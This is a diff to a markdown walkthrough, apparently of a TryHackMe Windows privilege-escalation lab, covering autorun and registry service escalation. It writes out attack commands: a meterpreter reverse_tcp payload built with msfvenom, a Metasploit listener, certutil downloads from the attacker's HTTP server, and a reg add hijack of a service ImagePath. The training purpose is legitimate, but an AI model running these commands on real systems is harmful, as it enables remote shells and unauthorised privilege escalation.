@@ -109,18 +109,24 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Aut
 
 <br>
 <br>
-
-
-<br>
 <br>
 
 <img width="1064" height="180" alt="image" src="https://github.com/user-attachments/assets/09b2df8b-35ce-4873-a89f-b61c1b8d334d" />
 
+<br>
+<br>
+<br>
+
+<img width="991" height="235" alt="image" src="https://github.com/user-attachments/assets/0830e90c-065b-4979-82ac-95a879a2ea98" />
+
+<br>
+<br>
+<br>
 
 <p aling="center">Exploitation</p>
 
 ```bash
-:~/WindowsPrivEscArena# mfsconsole
+:~/WindowsPrivEscArena# mfsconsole -q
 ...
 msf6>
 ```
@@ -141,14 +147,12 @@ LHOST => 10.201.113.77
 ```
 
 ```bash
-msf6 exploit(multi/handler) > set LPORT 9001
-LPORT => 9001
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.201.113.77:4444
 ```
 
-```bash
-msf6 exploit(multi/handler) > run
-[*] Started reverse TCP handler on 10.201.113.77:9001
-```
+<img width="1289" height="651" alt="image" src="https://github.com/user-attachments/assets/fc173d13-1141-444f-b8a9-7190e6e5a61b" />
+
 
 ```bash
 :~/WindowsPrivEscArena# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.201.113.77 LPORT=9001 -f exe -o program.exe
@@ -163,17 +167,12 @@ Saved as: program.exe
 
 <img width="580" height="85" alt="image" src="https://github.com/user-attachments/assets/9f059262-6490-4048-aa6d-4fb1239b3638" />
 
+<br>
+<br>
+<br>
 
 ```bash
-PS C:\Users\user> certutil.exe -urlcache -f http://10.201.113.77:8000/program.exe
-****  Online  ****
-CertUtil: -URLCache command FAILED: 0x80072efd (WIN32: 12029)
-CertUtil: A connection with the server could not be established
-```
-
-
-```bash
-:~/WindowsPrivEscArena# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.201.113.77 LPORT=9001 -f exe -o program.exe
+:~/WindowsPrivEscArena# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.201.113.77 -f exe -o program.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
@@ -182,11 +181,126 @@ Final size of exe file: 73802 bytes
 Saved as: program.exe
 ```
 
+<img width="1290" height="257" alt="image" src="https://github.com/user-attachments/assets/274aa886-b213-4ce2-8a31-585169307f34" />
 
-
-
-
+<br>
+<br>
+<br>
 
 ```bash
-ubuntu@tryhackme:~/Desktop/Perimeter_logs/task6$ grep -E 'BLOCK' waf_logs.txt
+:~/WindowsPrivEscArena# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
+
+<br>
+
+```bash
+PS C:\Users\user> certutil.exe -urlcache -f http://10.201.113.77:8000/program.exe program.exe
+```
+
+<img width="988" height="110" alt="image" src="https://github.com/user-attachments/assets/8f23fcf8-a235-4494-8e6c-141c94326451" />
+
+<br>
+<br>
+<br>
+
+```bash
+:~/WindowsPrivEscArena# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.201.56.185 - - [28/Sep/2025 21:05:17] "GET /program.exe HTTP/1.1" 200 -
+```
+
+```bash
+:~/WindowsPrivEscArena# rdesktop -u TCM -p "Hacker123" 10.201.56.185 -g 80%
+```
+
+<img width="1453" height="623" alt="image" src="https://github.com/user-attachments/assets/67ae340f-d63c-474f-8723-1d20ca3a5ba8" />
+
+<br>
+<br>
+<br>
+
+<img width="1287" height="226" alt="image" src="https://github.com/user-attachments/assets/72f7c93e-e81a-4ba6-9ef2-ddabff77f600" />
+
+
+
+
+
+<br>
+<br>
+<h2 align="center">Task 5 . Service Escalation - Registry</h2>
+<h3 align="center">Detection</h3>
+
+
+<h3 align="center">Exploitation</h3>
+
+<p><em>Answer the questions below</em></p>
+
+<p>5.1. Deploy the machine and log into the user account via RDP.<br>
+<code>No answer needed</code></p>
+
+
+
+<img width="985" height="289" alt="image" src="https://github.com/user-attachments/assets/eb6413ea-57da-4315-a93d-a1de097c67f5" />
+
+<br>
+<br>
+<br>
+
+<img width="979" height="245" alt="image" src="https://github.com/user-attachments/assets/f2dc897d-a21e-463b-b4d3-097d5edfa2ec" />
+
+<br>
+<br>
+<br>
+
+<img width="1239" height="218" alt="image" src="https://github.com/user-attachments/assets/d0a1450d-b8f4-4fc1-be6c-565539f35669" />
+
+<br>
+<br>
+<br>
+
+<img width="1182" height="398" alt="image" src="https://github.com/user-attachments/assets/a37f03d7-339b-44f1-9d1a-02b4d11f784e" />
+
+<br>
+<br>
+
+<img width="1228" height="391" alt="image" src="https://github.com/user-attachments/assets/622229eb-5ed6-405b-802e-91863f94e6b9" />
+
+<br>
+<br>
+
+```bash
+:~/WindowsPrivEscArena# x86_64-w64-mingw32-gcc windows_service.c -o x.exe
+```
+
+```bash
+:~/WindowsPrivEscArena# python3 -m http.server
+```
+
+<br>
+
+```bash
+PS C:\Temp> certutil.exe -urlcache -f http://xx.xxx.xxx.xx:8000/x.exe x.exe
+```
+
+```bash
+PS C:\Temp> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+```
+
+```bash
+PS C:\Temp> sc start regsvc
+```
+
+```bash
+PS C:\Temp> net start regsvc
+```
+
+<img width="985" height="552" alt="image" src="https://github.com/user-attachments/assets/8983cf09-7ff4-4e44-89d0-2d6201fc086e" />
+
+<br>
+<br>
+<br>
+
+
+<br>
+<br>
